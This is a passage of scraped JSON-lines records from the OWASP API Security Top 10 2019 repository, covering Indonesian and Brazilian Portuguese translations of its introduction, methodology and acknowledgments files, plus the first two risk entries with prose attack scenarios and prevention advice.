meningkatkan proses saat membangun API. Beberapa proyek OWASP lainnya tersedia untuk membantu Anda selama fase pengembangan API yang berbeda misalnya, [OWASP Code Review Project][14]. |\n\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Project\n[2]: https://www.owasp.org/index.php/OWASP_Education_Material_Categorized\n[3]: https://www.owasp.org/index.php/OWASP_API_Security_Project#tab=Road_Map\n[4]: https://devslop.co/Home/Pixi\n[5]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[6]: https://www.owasp.org/index.php/OWASP_Chapter\n[7]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[8]: https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex\n[9]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[10]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Security_Cheat_Sheet.md\n[11]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[12]: https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2018\n[13]: https://www.owasp.org/index.php/OWASP_SAMM_Project\n[14]: https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project\n", "timestamp": "2025-10-24T22:26:37.539477"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xb1-next-devsecops.md", "content": "# Apa Selanjutnya untuk DevSecOps\n\nKarena pentingnya dalam arsitektur aplikasi modern, membangun API yang aman sangat penting. Keamanan tidak boleh diabaikan, dan itu harus menjadi bagian dari seluruh siklus pengembangan. Pemindaian dan penetration testing setahun sekali tidak lagi cukup. \n\nDevSecOps harus bergabung dengan upaya pengembangan, memfasilitasi pengujian keamanan yang berkelanjutan di seluruh siklus pengembangan perangkat lunak. Tujuan mereka adalah untuk meningkatkan pipeline pengembangan dengan otomatisasi keamanan, dan tanpa berdampak pada kecepatan pengembangan.\n\nJika ragu, tetap terinformasi, dan tinjau, [DevSecOps Manifesto][1] sering.\n\n| | |\n|-|-|\n| **Pahami Model Ancaman** | Prioritas pengujian berasal dari model ancaman. Jika Anda tidak memilikinya, pertimbangkan menggunakan [OWASP Application Security Verification Standard (ASVS)][2], dan [OWASP Testing Guide][3] sebagai input. Melibatkan tim pengembangan dapat membantu membuat mereka lebih sadar keamanan. |\n| **Pahami SDLC** | Bergabung dengan tim pengembangan untuk lebih memahami Siklus Hidup Pengembangan Perangkat Lunak. Kontribusi Anda pada pengujian keamanan berkelanjutan harus kompatibel dengan orang, proses, dan alat. Semua orang harus setuju dengan prosesnya, sehingga tidak ada gesekan atau perlawanan yang tidak perlu. |  \n| **Strategi Pengujian** | Karena pekerjaan Anda tidak boleh berdampak pada kecepatan pengembangan, Anda harus bijaksana memilih teknik terbaik (sederhana, tercepat, paling akurat) untuk memverifikasi persyaratan keamanan. [OWASP Security Knowledge Framework][4] dan [OWASP Application Security Verification Standard][5] dapat menjadi sumber persyaratan keamanan fungsional dan non-fungsional yang hebat. Ada sumber lain yang hebat untuk [proyek][6] dan [alat][7] serupa dengan yang ditawarkan oleh [komunitas DevSecOps][8]. |\n| **Meraih Cakupan dan Akurasi** | Anda adalah jembatan antara tim pengembang dan operasi. Untuk mencapai cakupan, Anda tidak hanya harus fokus pada fungsionalitas, tetapi juga orkestrasi. Bekerja dekat dengan tim pengembangan dan operasi dari awal sehingga Anda dapat mengoptimalkan waktu dan upaya Anda. Anda harus menargetkan keadaan di mana keamanan esensial diverifikasi secara berkelanjutan. |\n| **Komunikasikan Temuan dengan Jelas** | Berikan nilai dengan sedikit atau tanpa gesekan. Kirim temuan tepat waktu, dalam alat yang digunakan tim pengembangan (bukan file PDF). Bergabung dengan tim pengembangan untuk menangani temuan. Manfaatkan kesempatan untuk mendidik mereka, menjelaskan kelemahan dan bagaimana dapat disalahgunakan, termasuk skenario serangan untuk membuatnya nyata. |\n\n[1]: https://www.devsecops.org/\n[2]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project  \n[3]: https://www.owasp.org/index.php/OWASP_Testing_Project\n[4]: https://www.owasp.org/index.php/OWASP_Security_Knowledge_Framework\n[5]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[6]: http://devsecops.github.io/  \n[7]: https://github.com/devsecops/awesome-devsecops\n[8]: http://devsecops.org\n\n", "timestamp": "2025-10-24T22:26:37.648846"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xd0-about-data.md", "content": "# Metodologi dan Data\n\n## Ikhtisar\n\nKarena industri AppSec belum secara khusus difokuskan pada arsitektur aplikasi paling mutakhir, di mana API memainkan peran penting, menyusun daftar sepuluh risiko keamanan API paling kritis, berdasarkan panggilan data publik, akan menjadi tugas yang sulit. Meskipun tidak ada panggilan data publik, daftar Top 10 yang dihasilkan masih didasarkan pada data yang tersedia untuk publik, kontribusi pakar keamanan, dan diskusi terbuka dengan komunitas keamanan.\n\n## Metodologi \n\nPada fase pertama, data publik tentang insiden keamanan API dikumpulkan, ditinjau, dan dikategorikan oleh sekelompok pakar keamanan. Data tersebut dikumpulkan dari platform bug bounty dan basis data kerentanan, dalam rentang waktu satu tahun. Itu digunakan untuk tujuan statistik.\n\nPada fase berikutnya, praktisi keamanan dengan pengalaman penetration testing diminta untuk menyusun daftar Top 10 mereka sendiri. \n\n[OWASP Risk Rating Methodology][1] digunakan untuk melakukan Analisis Risiko. Skor didiskusikan dan ditinjau di antara praktisi keamanan. Untuk pertimbangan mengenai hal ini, harap merujuk pada bagian [API Security Risks][2].\n\nDraf pertama OWASP API Security Top 10 2019 dihasilkan dari konsensus antara hasil statistik dari fase satu, dan daftar praktisi keamanan. Draf ini kemudian diserahkan untuk penghargaan dan tinjauan oleh kelompok praktisi keamanan lainnya, dengan pengalaman yang relevan di bidang keamanan API. \n\nOWASP API Security Top 10 2019 pertama kali dipresentasikan dalam acara OWASP Global AppSec Tel Aviv (Mei 2019). Sejak saat itu, telah tersedia di GitHub untuk diskusi publik dan kontribusi. \n\nDaftar kontributor tersedia di bagian [Penghargaan][3].\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md", "timestamp": "2025-10-24T22:26:37.760924"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0xd1-acknowledgments.md", "content": "# Ucapan Terima Kasih \n\n## Ucapan Terima Kasih kepada Kontributor\n\nKami ingin berterima kasih kepada kontributor berikut yang berkontribusi secara publik di GitHub atau melalui cara lain:\n\n* 007divyachawla\n* Abid Khan\n* Adam Fisher  \n* anotherik\n* bkimminich\n* caseysoftware\n* Chris Westphal\n* dsopas\n* DSotnikov\n* emilva\n* ErezYalon\n* faizzaidi\n* flascelles\n* Guillaume Benats\n* IgorSasovets \n* Inonshk\n* JonnySchnittger\n* jmanico\n* jmdx\n* Keith Casey\n* kozmic\n* LauraRosePorter\n* Matthieu Estrade\n* nathanawmk\n* PauloASilva\n* pentagramz\n* philippederyck\n* pleothaud\n* r00ter\n* Raj kumar\n* Sagar Popat\n* Stephen Gates\n* thomaskonrad\n* xycloops123", "timestamp": "2025-10-24T22:26:37.883535"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0x00-header.md", "content": "---\ntitle: ''\n---\n\n![OWASP LOGO](images/owasp-logo.png)\n\n# Os dez mais críticos riscos de segurança de API\n\nUma tradução para o português do Brasil do projeto original \"The Ten Most Critical API Security Risks\"\n\nMarch 10th, 2020\n\n![OWASP Logo URL TBA](images/front-wasp.png)\n\n| | | |\n| - | - | - |\n| https://owasp.org | Este trabalho é licenciado sob a [Atribuição-CompartilhaIgual 4.0 Internacional (CC BY-SA 4.0)][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: https://creativecommons.org/licenses/by-sa/4.0/deed.pt_BR\n", "timestamp": "2025-10-24T22:26:38.561283"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0x00-notice.md", "content": "# Nota\n\nEsta é a versão em formato texto do projeto \"OWASP API Security Top 10\", sendo utilizado como fonte da versão oficial distribuída no formato PDF.\n\nContribuições com o projeto, tais como comentários, correções ou traduções devem ser feitos por aqui. Para mais detalhes, veja o ducumento [Como contribuir][1], consulte também o documento [CONTRIBUTING.md][1].\n\n* Erez Yallon\n* Inon Shkedy\n\n[1]: ./CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:26:38.678155"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0x00-toc.md", "content": "# Tabela de conteúdo\n\n* [Tabela de conteúdo](0x00-toc.md)\n* [Sobre o OWASP](0x01-about-owasp.md)\n* [Prefácio](0x02-foreword.md)\n* [Introdução](0x03-introduction.md)\n* [Notas da Versão](0x04-release-notes.md)\n* [Riscos de Segurança de API](0x10-api-security-risks.md)\n* [OWASP Top 10 Riscos de Segurança de API – 2019](0x11-t10.md)\n* [API1:2019 Broken Object Level Authorization](0xa1-broken-object-level-authorization.md)\n* [API2:2019 Broken User Authentication](0xa2-broken-user-authentication.md)\n* [API3:2019 Excessive Data Exposure](0xa3-excessive-data-exposure.md)\n* [API4:2019 Lack of Resources & Rate Limiting](0xa4-lack-of-resources-and-rate-limiting.md)\n* [API5:2019 Broken Function Level Authorization](0xa5-broken-function-level-authorization.md)\n* [API6:2019 Mass Assignment](0xa6-mass-assignment.md)\n* [API7:2019 Security Misconfiguration](0xa7-security-misconfiguration.md)\n* [API8:2019 Injection](0xa8-injection.md)\n* [API9:2019 Improper Assets Management](0xa9-improper-assets-management.md)\n* [API10:2019 Insufficient Logging & Monitoring](0xaa-insufficient-logging-monitoring.md)\n* [Próximos passos para Desenvolvedores](0xb0-next-devs.md)\n* [Próximos passos para DevSecOps](0xb1-next-devsecops.md)\n* [Metodologia e Dados](0xd0-about-data.md)\n* [Agradecimentos](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:38.791463"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0x01-about-owasp.md", "content": "# Sobre o OWASP\n\nOWASP é o acrônimo em inglês para \"Open Web Application Security Project\", é uma comunidade aberta, dedicada a habilitar as organizações a desenvolver, comprar e manter aplicações e APIs que podem ser confiáveis.\n\nNo OWASP, você irá encontrar de forma gratuita e aberta:\n\n*  Ferramentas e padrões de segurança de aplicativos.\n* Livros completos sobre testes de segurança de aplicativos, desenvolvimento seguro de código e revisão de código seguro.\n* Apresentações e [vídeos][1].\n* [Cheat sheets][2] em diversos tópicos.\n* Padrões de controles de segurança e bibliotecas.\n* [Capítulos locais em todo o mundo][3].\n* Pesquisas inovadoras.\n* Extensivas [conferências ao redor do mundo][4].\n* [Listas de e-mail][5].\n\nSaiba mais em: [https://www.owasp.org][6].\n\nNo OWASP, todas as ferramentas, documentações, vídeos, apresentações e capítulos são gratuitos e abertos para qualquer um interessado em melhorar a segurança de aplicações\n\nNós advogamos a abordagem da segurança das aplicações como um problema de pessoas, processos e tecnologia, uma vez que as abordagens mais efetivas na segurança de aplicações necessitam de melhorias nestas áreas.\n\nO OWASP é um novo tipo de organização. Nossa independência de pressão comercial permite-nos prover informações e práticas livres de vieses e de efetivo custo benefício sobre segurança de aplicações.\n\nO OWASP não é afiliado a qualquer empresa de tecnologia, embora nosso suporte ao uso de tecnologias comercias. O OWASP produz diversos materiais de forma colaborativa, transparente e aberta.\n\nA Fundação OWASP é uma entidade não comercial, que encoraja projetos de sucesso há muito tempo. Praticamente todos os envolvidos com o OWASP são voluntários, incluindo os que integram a diretoria, líderes de capítulos, líderes de projetos e membros de cada projeto. Nós apoiamos pesquisas inovadoras de segurança com doações e infraestrutura.\n\nVenha conosco!\n\n## Licença e Copyright\n\n![license](images/license.png)\n\nCopyright © 2003-2019 The OWASP Foundation. Este documento é liberado sob a [Atribuição-CompartilhaIgual 4.0 Internacional (CC BY-SA 4.0)][7]. Para qualquer reuso ou distribuição, tenha certeza à terceiros os termos deste trabalho.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://owasp.org/www-project-cheat-sheets/\n[3]: https://owasp.org/chapters/\n[4]: https://wiki.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[5]: https://lists.owasp.org/mailman/listinfo\n[6]: https://owasp.org/\n[7]: https://creativecommons.org/licenses/by-sa/4.0/deed.pt_BR\n", "timestamp": "2025-10-24T22:26:38.907268"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0x02-foreword.md", "content": "# Prefácio\n\nElemento fundamental na inovação nas soluções *app-driven* nos dias de hoje são as APIs (*Application Programming Interface*). Desde os bancos, lojas, transportes, IoT, veículos autônomos e cidades inteligentes, as APIs são parte crítica de soluções modernas de móvel, SaaS, aplicações web em geral, e podem ser encontradas em interfaces com o cliente, parceiros e aplicações internas.\n\nPor natureza, as APIs expõem a lógica dos aplicativos e dados sensíveis, inclusive, dados pessoais sensíveis, e por esta razão, as APIs vem se tornando cada vez mais alvo de atacantes. Sem APIs seguras, inovações podem se tornar impossíveis.\n\nEmbora uma ampla avaliação de Top 10 a respeito da segurança de aplicações faça sentido, em razão de suas particularidades, uma lista de riscos de segurança específica para APIs também é um requisito. A segurança de APIs tem foco em estratégias e soluções para a compreensão e mitigação de vulnerabilidades únicas associadas às APIs.\n\nSe você é familiarizado com o projeto [OWASP Top 10][1], irá perceber similaridades entre os dois documentos: Isto é intencional para facilitar a compreensão e adoção. Se você é um novato nas séries Top 10 do OWASP, talvez seja melhor você ler atentamente as seções [Riscos de Segurança de API][2] e [Metodologia e Dados][3] antes.\n\nVocê pode contribuir com o projeto OWASP API Security Top 10 com questionamentos, comentários e ideias por meio do repositório do projeto no GitHub:\n\n* https://github.com/OWASP/API-Security/issues\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nVocê encontra o OWASP API Security Top 10 aqui:\n\n* https://owasp.org/www-project-api-security/\n* https://github.com/OWASP/API-Security\n\nNós gostaríamos de agradecer a todos colaboradores que fizeram este projeto possível com seus esforços e contribuições. Todos que participaram estão listados na seção [Agradecimentos][4]. Obrigado!\n\n[1]: https://owasp.org/www-project-top-ten/\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:39.015673"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0x03-introduction.md", "content": "# Introdução\n\n## Seja bem-vindo ao OWASP API Security Top 10 - 2019!\n\nSeja bem-vindo à primeira edição do projeto OWASP API Security Top 10. Se você está familiarizado com a série Top 10 do OWASP, irá perceber certas similaridades: elas são intencionais para melhor leitura a adoção. Se não é o seu caso, considere visitar a [wiki][1] do projeto antes de mergulhar mais profundamente nos mais críticos riscos de segurança de APIs.\n\nAs APIs possuem papel fundamental na arquitetura de aplicações modernas. Inovação e consciência de segurança possuem ritmos diferentes. É importante ter foco nas fraquezas mais comuns na segurança de APIs.\n\nO primeiro objetivo do projeto OWASP API Security Top 10 é educar aqueles que estejam envolvidos no desenvolvimento e manutenção de APIs. Podem ser, por exemplo: desenvolvedores, designers, arquitetos, gerentes e organizações.\n\nNa seção [Metodologia e Dados][2] você pode ler mais a respeito de como esta primeira versão foi criada. Em futuras versões, desejamos envolver a indústria da segurança com uma chamada pública para contribuição de dados. Por ora, nós encorajamos todos que possam contribuir com questionamentos, comentários e ideias em nosso [repositório no GitHub][3] ou nossa [lista de e-mails][4].\n\n[1]: https://owasp.org/www-project-api-security/\n[2]: ./0xd0-about-data.md\n[3]: https://github.com/OWASP/API-Security\n[4]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:39.123154"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0x04-release-notes.md", "content": "# Notas da Versão\n\nEsta é a primeira edição do projeto OWASP API Security Top 10, que desejamos que seja atualizado periodicamente a cada três ou quatro anos.\n\nAo contrário dessa versão, para o futuro, desejamos fazer uma chamada pública por dados e envolver a indústria de segurança neste esforço. Na seção [Metodologia e Dados][1] você irá encontrar mais detalhes a respeito de como esta versão foi construída. Para mais detalhes a respeito de riscos de segurança, consulte a seção [Riscos de Segurança de API][2].\n\nÉ importante realizar que durante os últimos anos a arquitetura das aplicações foram significativamente modificadas. Atualmente, as APIs representam um papel muito importante nessa nova arquitetura de microserviços, *single page applications*, aplicativos móveis, IoT e etc.\n\nO projeto OWASP Security Top 10 foi um esforço necessário para criar uma consciência a respeito de problemas de segurança de APIs. Este projeto só foi possível com o esforço de diversos voluntários, todos listados na seção [Agradecimentos][3]. Obrigado!\n\n[1]: ./0xd0-about-data.md\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:39.238394"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0x10-api-security-risks.md", "content": "# Riscos de Segurança de API\n\nA [Metodologia de Avaliação de Risco do OWASP][1] foi adotada para a análise dos riscos de API. \n\nA tabela abaixo resume a terminologia associada à pontuação de risco.\n\n| Agentes de Ameaça | Explorabilidade | Prevalência da Fraqueza | Detecção da Fraqueza | Impacto Técnico | Impacto ao Negócio |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| Específico da API | Fácil: **3** | Difundida **3** | Fácil **3** | Severo **3** | Específico do negócio |\n| Específico da API | Média: **2** | Comum **2** | Média **2** | Moderado **2** | Específico do negócio |\n| Específico da API | Difícil: **1** | Difícil **1** | Difícil **1** | Menor **1** | Específico do negócio |\n\n**Nota**: Esta abordagem não leva em consideração um agente de ameaça interno. Também não considera detalhes técnicos associados à sua aplicação em específico. Estes são fatores que podem afetar de maneira significativa a probabilidade de um atacante encontrar e explorar vulnerabilidades específicas. Esta classificação também não avalia impactos ao seu negócio. Sua organização terá que decidir quanto risco de segurança de aplicativos e APIs que a organização está disposta a aceitar, dada sua cultura, indústria e ambiente regulatório. O propósito do OWASP API Security top 10 não é desenvolver uma análise de risco por você.\n\n## Referências\n\n### OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### Externas\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://owasp.org/www-project-risk-assessment-framework/\n[2]: https://owasp.org/www-community/Application_Threat_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:39.346625"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0x11-t10.md", "content": "# OWASP Top 10 Riscos de Segurança de API – 2019\n\n| Risco | Descrição |\n| ---- | ----------- |\n| API1:2019 - Broken Object Level Authorization | APIs tendem a expor *endpoints* para manipulação de objetos internos criando uma ampla camada de ataque ao controle de nível de acesso. O controle de autorização deve ser verificado em toda função que tenha acesso à fontes de dados que utilizem dados enviados pelo usuário. |\n| API2:2019 - Broken User Authentication | Mecanismos de autorização não raramente são implementados incorretamente, permitindo que atacantes comprometam tokens de autenticação ou explorem falhas na implementação para assumir identidades temporária ou permanentemente. Isto compromete a habilidade dos sistemas em identificar o usuário/cliente comprometendo a segurança da API. |\n| API3:2019 - Excessive Data Exposure | Implementações rápidas e de maneira genérica podem fazer que desenvolvedores exponham todas as propriedades dos objetos sem considerar que determinadas informações podem ser sensíveis ao indivíduo e deixando ao cliente as atividades de filtrar as informações antes de exibi-las ao usuário. |\n| API4:2019 - Lack of Resources & Rate Limiting | Não raramente APIs não impõem restrições ao tamanho ou à quantidade de recursos que podem ser requisitados pelo cliente/usuário. O impacto vai além do desempenho de servidores de API, resultado em *Denial of Service (DoS)*, mas também, podem deixar portas abertas para falhas de autenticação por força bruta. |\n| API5:2019 - Broken Function Level Authorization | Políticas complexas no controle de acesso, com diferentes hierarquias, grupos, papéis e uma falta de clareza na separação entre papéis comuns e de administração podem levar a falhas de autenticação. Explorando esta condição, atacantes podem ganhar acesso à recursos de terceiros ou à funções administrativas. |\n| API6:2019 - Mass Assignment | Conectar dados entregues pelo cliente (ex. JSON) diretamente em modelos de dados sem filtrar apropriadamente propriedades em *whitelist* podem eventualmente levar a atribuição em massa. Mesmo buscando adivinhar propriedades, explorando outros *endpoints*, consultando documentação e enviando propriedades adicionais em *payload* os atacantes podem modificar propriedades de objetos os quais não deveria. |\n| API7:2019 - Security Misconfiguration | Configurações de segurança incorretas, de maneira geral, é resultado de configurações padrão ou configurações incompletas. Armazenamento em nuvem abertas, configurações incorretas em cabeçalhos HTTP, métodos HTTP desnecessários, CORS permissivos e divulgação de mensagens de erro com informações sensíveis. |\n| API8:2019 - Injection | Injeção de falhas como SQL, NoSQL, injeção de comandos e etc, ocorrem quando informações não confiáveis são enviadas ao interpretador como parte de um comando ou consulta. A informação maliciosa do atacante pode enganar o interpretador a executar comandos não esperados ou acessar dados sem a autorização adequada. |\n| API9:2019 - Improper Assets Management | APIs tendem a expor mais *endpoints* que uma aplicação web tradicional, de forma que documentação apropriada e atualizada é muito importante. Gestão de inventário de versões de API tem papel importante para mitigar problemas como versões antigas de API e *endpoints* de debug. |\n| API10:2019 - Insufficient Logging & Monitoring | Falta de log e monitoramento, acoplado com falta ou ineficiente integração com respostas a incidentes, permite que atacantes consigam ter persistência e descobrir outros sistemas para explorar, extrair ou destruir informação. Muitos estudos demonstram que a descoberta de uma brecha leva mais de 200 dias para ser identificada, além de muitas vezes ser detectada mais por terceiros que por um processo interno. |\n", "timestamp": "2025-10-24T22:26:39.466197"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xa1-broken-object-level-authorization.md", "content": "# API1:2019 Broken Object Level Authorization\n\n| Agentes/Vetores | Fraquezas de Segurança | Impactos |\n| - | - | - |\n| Específico da API : Explorabilidade **3** | Prevalência **3** : Detecção **2** | Técnico **3** : Específico do negócio|\n| Atacantes podem explorar *endpoints* de API que estejam vulneráveis a quebrar níveis de autorização com a manipulação de ID de objeto enviado na requisição. Isto pode levar a acesso à informações não autorizadas a dados sensíveis. Este problema é extremamente comum em aplicações baseadas em APIs uma vez que os componentes de servidores usualmente não verificam o estado do cliente, ao invés disso, confia em parâmetros como IDs de objeto que são enviados pelo cliente que decide qual objeto acessar. | Este é o mais comum e impactante ataque contra APIs. Autorização e mecanismos de controle de acesso em aplicações modernas são complexos e amplos. Mesmo se a aplicação implementa uma apropriada infraestrutura de verificação de autorização, desenvolvedores podem esquecer de usar tais verificações antes de acessar objetos com informações sensíveis. Controle de acesso não é tipicamente favorável a testes automatizados, estáticos ou dinâmicos. | Acesso não autorizado pode resultar no vazamento de dados à partes não autorizadas, perda ou manipulação de dados. Acesso não autorizado à objetos também podem levar a tomada de contas. |\n\n## A API está vulnerável?\n\nO nível de autorização de objeto é um mecanismo de controle de acesso que usualmente é implementado ao nível de código para validar que um usuário pode apenas acessar objetos aos quais realmente tem permissão.\n\nTodo *endpoint* de API que recebe um ID de objeto, e executa qualquer tipo de ação sobre este objeto, deve implementar verificações de autorização de acesso ao nível deste objeto. A verificação deve validar que o usuário tem acesso para executar aquela ação no objeto requisitado.\n\nFalhas nesse mecanismo geralmente levam ao acesso não autorizado de informações, vazamento de dados, modificação ou destruição de dados.\n\n## Cenários de exemplo de ataques\n\n### Cenário #1\n\nUma plataforma de *e-commerce* para lojas de compras online entrega uma listagem com os gráficos de receita de suas lojas hospedadas. Inspecionando as requisições do navegador, o atacante pode identificar que os *endpoints* utilizados como fonte de dados para os gráficos utiliza um padrão como `/shops/{shopName}/revenue_data.json`. Utilizando outro *endpoint* da API, o atacante consegue uma lista de todos os nomes das lojas hospedadas na plataforma. Com um simples *script* o atacante pode agora, manipulando o nome substituindo o parâmetro `{shopName}` na URL, ganhar acesso aos dados das vendas de milhares de lojas que utilizam a plataforma de *e-commerce*.\n\n### Cenário #2\n\nEnquanto monitora o tráfego de rede um *wearable device*, o atacante tem sua atenção despertada ao perceber o verbo HTTP `PATCH` possui o cabeçalho customizado `X-User-Id: 54796`. Substituindo o valor do cabeçalho o atacante recebe uma resposta HTTP válida, sendo possível portanto modificar os dados de outros usuários.\n\n## Como prevenir\n\n* Implementar mecanismo apropriado de autorização de acesso baseado em políticas e hierarquias.\n* Utilizar uma autorização para verificar se o usuário pode acessar e executar ações nos registros em todas as funções que utiliza *input* do usuário para acessar dados.\n* Prefira utilizar valores randômicos como GUIs para ids de registros.\n* Escreva testes para avaliar seu mecanismo de autorização, não autorize *deployment* de mudanças de código que quebrem estes testes.\n\n## Referências\n\n### Externas\n\n* [CWE-284: Improper Access Control][1]\n* [CWE-285: Improper Authorization][2]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][3]\n\n[1]: https://cwe.mitre.org/data/definitions/284.html\n[2]: https://cwe.mitre.org/data/definitions/285.html\n[3]: https://cwe.mitre.org/data/definitions/639.html\n", "timestamp": "2025-10-24T22:26:39.581663"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-BR/0xa2-broken-user-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-BR/0xa2-broken-user-authentication.md", "content": "# API2:2019 Broken User Authentication\n\n| Agentes/Vetores | Fraquezas de Segurança | Impactos |\n| - | - | - |\n| Específico da API : Explorabilidade **3** | Prevalência **2** : Detecção **2** | Técnico **3** : Específico do negócio |\n| Autenticação em APIs é um mecanismo complexo e confuso. Engenheiros e arquitetos de software e segurança podem ter conceitos equivocados a respeito de quais são os limites da autenticação e na forma como devem ser implementados corretamente. Adicionalmente, mecanismos de autenticação são alvo de atacantes pois estão expostos a todos. Estes dois pontos fazem da autenticação um componente vulnerável a muitos tipos de *exploits*. | Existem dois tipos de sub-problemas: 1. Falta de mecanismo de proteção: Os *endpoints* da API que geralmente são responsáveis pela autenticação devem ser tratados diferentemente dos *endpoints* regulares e implementam camadas extras de proteção. 2. Má implementação do mecanismo: O mecanismo é usado ou implementado sem considerar vetores de ataque ou com casos de uso inadequados (ex.: um mecanismo de autenticação desenvolvido para dispositivos IoT pode não ser a melhor opção para aplicativos web). | Atacantes podem tomar controle de outras contas de usuários no sistema, acessar seus dados pessoais e executar ações sensíveis em seu nome, como transações financeiras e enviar mensagens pessoais. |\n\n## A API está vulnerável?\n\nOs *endpoints* e fluxos de autorização são ativos que devem ser protegidos. \"Esqueci minha senha/Redefinição de senha\" devem ser tratados da mesma forma que outros mecanismos de autenticação.\n\nUma API está vulnerável se:\n* Permite a prática de *[credential stuffing][1]* o qual o atacante tem uma lista de nomes de usuário e senhas.\n* Permite que atacantes executem força bruta contra uma mesma conta de usuário sem exibir CAPTCHA ou mecanismo de bloqueio da conta.\n* Permite o uso de senhas fracas.\n* Envia detalhes sensíveis da autenticação como *tokens* e senhas na URL.\n* Não executa a validação de autenticidade de *tokens*.\n* Aceita *tokens* JWT não assinados/fracos (`\"alg\":\"none\"`)/não valida data de expiração.\n* Utiliza senhas em texto plano, não criptografadas ou com hash fraco de criptografia.\n* Usa chaves de criptografias fracas.\n\n## Cenários de exemplo de ataques\n\n### Cenário #1\n\n*[Credential stuffing][1]* (utilizando [listas de usuário e senha conhecidas][2]), é um ataque comum. Se uma aplicação não implementar em sua arquitetura proteções automatizadas ou proteções contra *credential stuffing*, a aplicação pode ser utilizada como base de teste para determinar se credenciais são válidas.\n\n### Cenário #2\n\nUm atacante inicia um processo de recuperação de senha enviando uma requisição POST para o *endpoint* `/api/system/verification-codes` e enviando um usuário no corpo da requisição. Um *token* SMS com 6 dígitos é enviado para o telefone móvel da vítima. Uma vez que a API não implementa um mecanismo de limite, o atacante pode testar todas as combinações possíveis utilizando um script *multi-thread* contra o endpoint `/api/system/verification-codes/{smsToken}` e assim descobrir o token correto em alguns minutos.\n\n## Como prevenir\n\n* Certifique-se que conhece todos os fluxos possíveis para autenticar-se na API.\n* Pergunte aos engenheiros/arquitetos quais fluxos você esqueceu.\n* Leia sobre seus mecanismos 